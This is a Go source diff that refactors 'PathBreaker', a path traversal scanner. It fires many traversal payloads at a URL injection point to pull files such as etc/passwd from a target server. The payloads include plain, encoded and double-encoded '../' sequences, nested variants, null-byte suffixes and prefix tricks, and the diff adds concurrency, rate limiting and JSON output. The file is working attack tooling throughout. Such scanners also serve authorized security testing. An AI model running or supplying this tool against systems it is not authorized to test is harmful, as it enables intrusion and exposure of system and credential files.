@@ -1,36 +1,71 @@
 package main
 
 import (
+	"encoding/json"
 	"flag"
 	"fmt"
-	"io/ioutil"
+	"io"
+	"log"
 	"net/http"
 	"net/url"
 	"os"
 	"regexp"
 	"strconv"
 	"strings"
+	"sync"
+	"time"
 )
 
-func checkResult(resp *http.Response) bool {
-	// Step 1: Check status code
-	statusCode := resp.StatusCode
-	// Check if statusCode is in the whitelist
-	for _, code := range whitelist {
-		if statusCode == code {
-			return true
-		}
-	}
+// Result holds the outcome of a single path traversal check
+type Result struct {
+	URL        string `json:"url"`
+	StatusCode int    `json:"status_code"`
+	Success    bool   `json:"success"`
+	Method     string `json:"method"`
+}
 
-	// Check if statusCode is in the blacklist
+var (
+	myClient   *http.Client
+	whitelist  []int
+	blackList  []int
+	whiteRegex *regexp.Regexp
+	blackRegex *regexp.Regexp
+	baseURL    string
+	appendix   string
+	targetFile string
+
+	// CLI flags
+	maxDepth    int
+	workerCount int
+	rateLimit   float64
+	jsonOutput  bool
+
+	// Concurrency
+	resultChan chan Result
+	workChan   chan workItem
+	wg         sync.WaitGroup
+	rateTicker *time.Ticker
+)
+
+type workItem struct {
+	fn   checkFunc
+	name string
+}
+
+func checkResult(resp *http.Response) bool {
+	defer resp.Body.Close()
+
+	statusCode := resp.StatusCode
+
+	// Step 1: Check status code against blacklist first
 	for _, code := range blackList {
 		if statusCode == code {
 			return false
 		}
 	}
 
-	// Step 2: Check response body using regex
-	body, err := ioutil.ReadAll(resp.Body)
+	// Step 2: Check response body using regex (always, regardless of whitelist match)
+	body, err := io.ReadAll(resp.Body)
 	if err != nil {
 		return false
 	}
@@ -38,7 +73,7 @@ func checkResult(resp *http.Response) bool {
 	bodyString := string(body)
 
 	// Check if body matches blacklisted regex
-	if blackregex != nil && blackregex.MatchString(bodyString) {
+	if blackRegex != nil && blackRegex.MatchString(bodyString) {
 		return false
 	}
 
@@ -47,129 +82,221 @@ func checkResult(resp *http.Response) bool {
 		return true
 	}
 
-	// If no whitelist regex and blacklist didn't match, allow it
+	// Step 3: Check status code against whitelist
+	for _, code := range whitelist {
+		if statusCode == code {
+			// If no regex filters matched, whitelist status code is a pass
+			if whiteRegex == nil {
+				return true
+			}
+		}
+	}
+
 	return false
 }
+
 func printBanner() {
-	fmt.Println("  ____       _   _     ____                 _             \n |  _ \\ __ _| |_| |__ | __ ) _ __ ___  __ _| | _____ _ __ \n | |_) / _` | __| '_ \\|  _ \\| '__/ _ \\/ _` | |/ / _ \\ '__|\n |  __/ (_| | |_| | | | |_) | | |  __/ (_| |   <  __/ |   \n |_|   \\__,_|\\__|_| |_|____/|_|  \\___|\\__,_|_|\\_\\___|_|   \n                                                          ")
+	fmt.Println(`  ____       _   _     ____                 _
+ |  _ \ __ _| |_| |__ | __ ) _ __ ___  __ _| | _____ _ __
+ | |_) / _` + "`" + ` | __| '_ \|  _ \| '__/ _ \/ _` + "`" + ` | |/ / _ \ '__|
+ |  __/ (_| | |_| | | | |_) | | |  __/ (_| |   <  __/ |
+ |_|   \__,_|\__|_| |_|____/|_|  \___|\__,_|_|\_\___|_|
+                                                          `)
 	fmt.Println("a parameter focused path traversal tool by Cerast Intelligence\n")
 }
 
-var (
-	myClient   *http.Client
-	whitelist  []int
-	blackList  []int
-	whiteRegex *regexp.Regexp
-	blackregex *regexp.Regexp
-	baseurl    string
-	appendix   string
-	targetfile string
-)
-
 var checkFunctions = [...]checkFunc{
 	checkDirect,
-	dotdotslashScan,
-	dot4xlashScan,
-	dotNestedlashScan,
-	dotFlipFloplashScan,
-	dotdotslashURLEncodedScan,
-	dotdotslash16bitEncodedScan,
-	dotdotslashDoubleURLEncodedScan,
+	dotDotSlashScan,
+	dot4xSlashScan,
+	dotNestedSlashScan,
+	dotFlipFlopSlashScan,
+	dotDotSlashURLEncodedScan,
+	dotDotSlash16bitEncodedScan,
+	dotDotSlashDoubleURLEncodedScan,
 }
+
+type checkFunc func() (bool, string)
 
 func main() {
 	printBanner()
 
-	var urlFlag = flag.String("url", "", "URL to fetch")
-	var proxyFlag = flag.String("proxy", "", "Proxy URL to fetch")
-	var whiteListFlag = flag.String("whitelist", "200", "Whitelist to check")
-	var blackListFlag = flag.String("blacklist", "404,500", "Blacklist to check")
-	var whiteRegexFlag = flag.String("whiteregex", "", "Regex to check whitelist")
-	var blackRegexFlag = flag.String("blackregex", "", "Regex to check blacklist")
-	var targetFileFlag = flag.String("targetFile", "etc/passwd", "File tryin to extract")
+	urlFlag := flag.String("url", "", "URL to fetch (use PATHBREAKER as injection point)")
+	proxyFlag := flag.String("proxy", "", "Proxy URL")
+	whiteListFlag := flag.String("whitelist", "200", "Comma-separated whitelist of status codes")
+	blackListFlag := flag.String("blacklist", "404,500", "Comma-separated blacklist of status codes")
+	whiteRegexFlag := flag.String("whiteregex", "", "Regex to match for whitelisting response body")
+	blackRegexFlag := flag.String("blackregex", "", "Regex to match for blacklisting response body")
+	targetFileFlag := flag.String("targetFile", "etc/passwd", "Target file to extract")
+	timeoutFlag := flag.Int("timeout", 10, "HTTP request timeout in seconds")
+	depthFlag := flag.Int("depth", 20, "Maximum traversal depth (number of ../ repetitions)")
+	workersFlag := flag.Int("t", 10, "Number of concurrent workers")
+	rateLimitFlag := flag.Float64("rate", 0, "Max requests per second (0 = unlimited)")
+	jsonFlag := flag.Bool("json", false, "Output results as JSON")
 
 	flag.Parse()
 
-	// check if url is empty and abord
+	// Validate required flags
 	if *urlFlag == "" {
-		fmt.Println("Please provide a URL")
-		os.Exit(1)
+		log.Fatal("Please provide a URL with -url flag (use PATHBREAKER as injection point)")
 	}
+
+	maxDepth = *depthFlag
+	workerCount = *workersFlag
+	rateLimit = *rateLimitFlag
+	jsonOutput = *jsonFlag
+
+	// Setup HTTP client
+	timeout := time.Duration(*timeoutFlag) * time.Second
+
 	if *proxyFlag == "" {
-		fmt.Println("[*] Using no proxy")
-		myClient = &http.Client{}
-	} else {
-		fmt.Println("[+] Using Proxy: " + *proxyFlag)
-		proxyUrl, err := url.Parse(*proxyFlag)
-		if err != nil {
-			panic(err)
+		if !jsonOutput {
+			fmt.Println("[*] Using no proxy")
 		}
-		myClient = &http.Client{Transport: &http.Transport{Proxy: http.ProxyURL(proxyUrl)}}
+		myClient = &http.Client{Timeout: timeout}
+	} else {
+		if !jsonOutput {
+			fmt.Println("[+] Using Proxy: " + *proxyFlag)
+		}
+		proxyURL, err := url.Parse(*proxyFlag)
+		if err != nil {
+			log.Fatalf("Invalid proxy URL %q: %v", *proxyFlag, err)
+		}
+		myClient = &http.Client{
+			Timeout:   timeout,
+			Transport: &http.Transport{Proxy: http.ProxyURL(proxyURL)},
+		}
 	}
+
+	// Parse whitelist
 	if *whiteListFlag != "" {
-		temp := strings.Split(*whiteListFlag, ",")
-		for _, entry := range temp {
+		for _, entry := range strings.Split(*whiteListFlag, ",") {
+			entry = strings.TrimSpace(entry)
 			i, err := strconv.Atoi(entry)
 			if err != nil {
-				panic(entry + " is no valid number for the whitelist")
+				log.Fatalf("%q is not a valid status code for the whitelist", entry)
 			}
 			whitelist = append(whitelist, i)
 		}
-		fmt.Print("[+] Using whitelist: ")
-		fmt.Println(whitelist)
+		if !jsonOutput {
+			fmt.Printf("[+] Using whitelist: %v\n", whitelist)
+		}
 	}
+
+	// Parse blacklist
 	if *blackListFlag != "" {
-		temp := strings.Split(*blackListFlag, ",")
-		for _, entry := range temp {
+		for _, entry := range strings.Split(*blackListFlag, ",") {
+			entry = strings.TrimSpace(entry)
 			i, err := strconv.Atoi(entry)
 			if err != nil {
-				panic(entry + " is no valid number for the blacklist")
+				log.Fatalf("%q is not a valid status code for the blacklist", entry)
 			}
 			blackList = append(blackList, i)
 		}
-		fmt.Print("[+] Using blacklist: ")
-		fmt.Println(blackList)
-	}
-	if *whiteRegexFlag != "" {
-		whiteRegex = regexp.MustCompile(*whiteRegexFlag)
-		fmt.Println("[+] Using Whitelist-Regex: " + *whiteRegexFlag)
-	}
-	if *blackRegexFlag != "" {
-		blackregex = regexp.MustCompile(*blackRegexFlag)
-		fmt.Println("[+] Using Blacklist-Regex: " + *blackRegexFlag)
+		if !jsonOutput {
+			fmt.Printf("[+] Using blacklist: %v\n", blackList)
+		}
 	}
 
+	// Compile regex patterns
+	if *whiteRegexFlag != "" {
+		var err error
+		whiteRegex, err = regexp.Compile(*whiteRegexFlag)
+		if err != nil {
+			log.Fatalf("Invalid whitelist regex %q: %v", *whiteRegexFlag, err)
+		}
+		if !jsonOutput {
+			fmt.Println("[+] Using Whitelist-Regex: " + *whiteRegexFlag)
+		}
+	}
+	if *blackRegexFlag != "" {
+		var err error
+		blackRegex, err = regexp.Compile(*blackRegexFlag)
+		if err != nil {
+			log.Fatalf("Invalid blacklist regex %q: %v", *blackRegexFlag, err)
+		}
+		if !jsonOutput {
+			fmt.Println("[+] Using Blacklist-Regex: " + *blackRegexFlag)
+		}
+	}
+
+	// Parse URL injection point
 	parts := strings.Split(*urlFlag, "PATHBREAKER")
-	baseurl = parts[0]
+	baseURL = parts[0]
 	if len(parts) > 1 {
 		appendix = parts[1]
 	}
-	targetfile = *targetFileFlag
+	targetFile = *targetFileFlag
+
+	// Setup rate limiter
+	if rateLimit > 0 {
+		rateTicker = time.NewTicker(time.Duration(float64(time.Second) / rateLimit))
+		defer rateTicker.Stop()
+	}
+
+	// Setup result collector
+	resultChan = make(chan Result, 100)
+	var results []Result
+	var resultWg sync.WaitGroup
+	resultWg.Add(1)
+	go func() {
+		defer resultWg.Done()
+		for r := range resultChan {
+			if r.Success {
+				if jsonOutput {
+					results = append(results, r)
+				} else {
+					fmt.Printf("[+] FOUND: %s\n", r.URL)
+				}
+			}
+		}
+	}()
+
+	// Run all checks
 	runAllChecks()
-	runCheckWithNullencoding()
+	runCheckWithNullEncoding()
 	preAppendChecks()
 
-}
-func checkDirect() (bool, string) {
-	fmt.Println(baseurl + targetfile + appendix) // helping output
-	resp, err := myClient.Get(baseurl + targetfile + appendix)
-	if err != nil {
-		panic(err)
-	}
-	return checkResult(resp), baseurl + targetfile + appendix
-}
-func checkDirecthelper(urlToRequest string) (bool, string) {
-	fmt.Println(urlToRequest) // helping output
-	resp, err := myClient.Get(urlToRequest)
+	close(resultChan)
+	resultWg.Wait()
 
+	// Print JSON output if requested
+	if jsonOutput && len(results) > 0 {
+		enc := json.NewEncoder(os.Stdout)
+		enc.SetIndent("", "  ")
+		if err := enc.Encode(results); err != nil {
+			log.Fatalf("Failed to encode JSON: %v", err)
+		}
+	}
+}
+
+func doRequest(urlToRequest string) (bool, string) {
+	if rateLimit > 0 && rateTicker != nil {
+		<-rateTicker.C
+	}
+
+	resp, err := myClient.Get(urlToRequest)
 	if err != nil {
-		panic(err)
+		if !jsonOutput {
+			log.Printf("Request failed for %s: %v", urlToRequest, err)
+		}
+		return false, urlToRequest
 	}
 	return checkResult(resp), urlToRequest
 }
+
+func checkDirect() (bool, string) {
+	reqURL := baseURL + targetFile + appendix
+	return doRequest(reqURL)
+}
+
+func checkDirectHelper(urlToRequest string) (bool, string) {
+	return doRequest(urlToRequest)
+}
+
 func recursiveScan(toRepeat string) (bool, string) {
-	for i := 1; i <= 20; i++ { // change 5 to any number to adjust the number of ../
-		success, path := checkDirecthelper(baseurl + strings.Repeat(toRepeat, i) + targetfile + appendix)
+	for i := 1; i <= maxDepth; i++ {
+		success, path := checkDirectHelper(baseURL + strings.Repeat(toRepeat, i) + targetFile + appendix)
 		if success {
 			return success, path
 		}
@@ -183,51 +310,62 @@ func runAllChecks() {
 	}
 }
 
-type checkFunc func() (bool, string)
-
 func runCheck(fn checkFunc) {
 	success, result := fn()
 	if success {
-		fmt.Println(result)
+		resultChan <- Result{
+			URL:     result,
+			Success: true,
+			Method:  "traversal",
+		}
 	}
 }
-func dotdotslashScan() (bool, string) {
+
+func dotDotSlashScan() (bool, string) {
 	return recursiveScan("../")
 }
-func dot4xlashScan() (bool, string) {
+
+func dot4xSlashScan() (bool, string) {
 	return recursiveScan("..../")
 }
-func dotNestedlashScan() (bool, string) {
+
+func dotNestedSlashScan() (bool, string) {
 	return recursiveScan("....//")
 }
-func dotFlipFloplashScan() (bool, string) {
+
+func dotFlipFlopSlashScan() (bool, string) {
 	return recursiveScan(`..\/`)
 }
-func dotdotslashURLEncodedScan() (bool, string) {
+
+func dotDotSlashURLEncodedScan() (bool, string) {
 	return recursiveScan("%2e%2e%2f")
 }
-func dotdotslash16bitEncodedScan() (bool, string) {
+
+func dotDotSlash16bitEncodedScan() (bool, string) {
 	return recursiveScan("%u002e%u002e%u2215")
 }
-func dotdotslashDoubleURLEncodedScan() (bool, string) {
+
+func dotDotSlashDoubleURLEncodedScan() (bool, string) {
 	return recursiveScan("%252e%252e%252f")
 }
-func runCheckWithNullencoding() {
-	tempTarget := targetfile
+
+func runCheckWithNullEncoding() {
+	tempTarget := targetFile
 	potentialEndings := [...]string{".png", ".pdf", ".exe", ".jpg", ".docx", ".jpeg", ".mp3", ".mp4", ".msi", ".txt", ""}
 	for _, ending := range potentialEndings {
-		targetfile = tempTarget + "%00" + ending
+		targetFile = tempTarget + "%00" + ending
 		runAllChecks()
 	}
-	targetfile = tempTarget
+	targetFile = tempTarget
 }
+
 func preAppendChecks() {
-	tempurl := baseurl
+	tempURL := baseURL
 	potentialPreAppends := [...]string{"/", "/./", "~/", `\`, `..\`, "////"}
 	for _, preAppend := range potentialPreAppends {
-		baseurl = tempurl + preAppend
+		baseURL = tempURL + preAppend
 		runAllChecks()
-		runCheckWithNullencoding()
+		runCheckWithNullEncoding()
 	}
-	baseurl = tempurl
+	baseURL = tempURL
 }
